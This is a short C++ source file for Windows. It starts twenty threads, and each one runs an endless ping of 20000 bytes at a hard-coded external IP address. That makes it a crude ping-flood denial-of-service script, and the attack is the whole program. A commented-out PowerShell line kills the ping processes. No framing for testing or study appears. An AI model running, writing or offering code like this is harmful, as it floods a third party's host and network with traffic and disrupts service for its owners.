#include <bits/stdc++.h>
#include <windows.h>
using namespace std;
string cmd = "ping 47.90.39.229 -t -l 20000";
// string cmd = "Get-Process -Name ping | foreach-object{$_.kill()}";

// void func() {

// }
DWORD WINAPI Func(LPVOID lpParameter)
{
    cout<< "thread function Fun1Proc!\n";
    system(cmd.c_str());

    return 0;
}

int main(int argc, char const *argv[]) {
    // HANDLE ts[100];
    for (int i=0; i<20; i++) {
        cout<<"Number"<<i<<endl;
        HANDLE ts = CreateThread(NULL, 0, Func, NULL, 0, NULL);
    }
    // Sleep(10);
    
    // system(cmd.c_str());
    return 0;
}
